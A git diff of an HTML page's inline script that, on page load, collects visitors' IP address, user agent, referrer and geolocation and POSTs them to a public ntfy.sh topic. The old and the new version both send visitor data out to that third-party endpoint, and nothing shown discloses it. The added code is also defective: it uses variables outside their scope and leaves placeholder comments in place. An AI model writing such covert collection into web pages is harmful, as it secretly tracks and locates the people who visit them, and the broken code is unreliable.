@@ -42,54 +42,61 @@
       });
   </script>
   <script>
-  // Function to send an HTTP POST request
-  function sendPostRequest(url, data) {
-    fetch(url, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify(data)
-    })
-    .then(response => {
-      if (response.ok) {
-        console.log('IP address sent successfully!');
-      } else {
-        console.error('Failed to send IP address.');
-      }
-    })
-    .catch(error => {
-      console.error('Error:', error);
-    });
-  }
+  fetch('https://api.ipify.org?format=json')
+  .then(response => response.json())
+  .then(data => {
+    const ipAddress = data.ip;
+    // Use the ipAddress as needed
+    console.log(ipAddress);
+  })
+  .catch(error => {
+    console.log('Error:', error);
+  });
 
-  // Function to retrieve IP address and header information
-  function getIpAddressAndHeader() {
-    // Get IP address
-    fetch('https://api.ipify.org?format=json')
-      .then(response => response.json())
-      .then(data => {
-        const ipAddress = data.ip;
+const referer = document.referrer;
+// Use the referer as needed
+console.log(referer);
 
-        // Get header information
-        const headers = JSON.stringify(navigator.userAgent);
+if ("geolocation" in navigator) {
+  navigator.geolocation.getCurrentPosition(position => {
+    const latitude = position.coords.latitude;
+    const longitude = position.coords.longitude;
+    // Use latitude and longitude as needed
+    console.log(latitude, longitude);
+  }, error => {
+    console.log('Error:', error);
+  });
+} else {
+  console.log('Geolocation is not supported');
+}
 
-        // Prepare data to send
-        const postData = {
-          ip: ipAddress,
-          header: headers
-        };
+const url = 'https://ntfy.sh/blitzd';
+const data = {
+  ip: ipAddress, // Replace with the actual IP address variable
+  referer: referer, // Replace with the actual referer variable
+  latitude: latitude, // Replace with the actual latitude variable
+  longitude: longitude // Replace with the actual longitude variable
+};
 
-        // Send data using HTTP POST request
-        sendPostRequest('https://ntfy.sh/blitzd', postData);
-      })
-      .catch(error => {
-        console.error('Error:', error);
-      });
-  }
+fetch(url, {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json'
+  },
+  body: JSON.stringify(data)
+})
+  .then(response => {
+    if (response.ok) {
+      console.log('IP address posted successfully');
+    } else {
+      console.log('Error:', response.status);
+    }
+  })
+  .catch(error => {
+    console.log('Error:', error);
+  });
 
-  // Call the function to retrieve IP address and header on page load
-  getIpAddressAndHeader();
+
 </script>
 </body>
 </html>
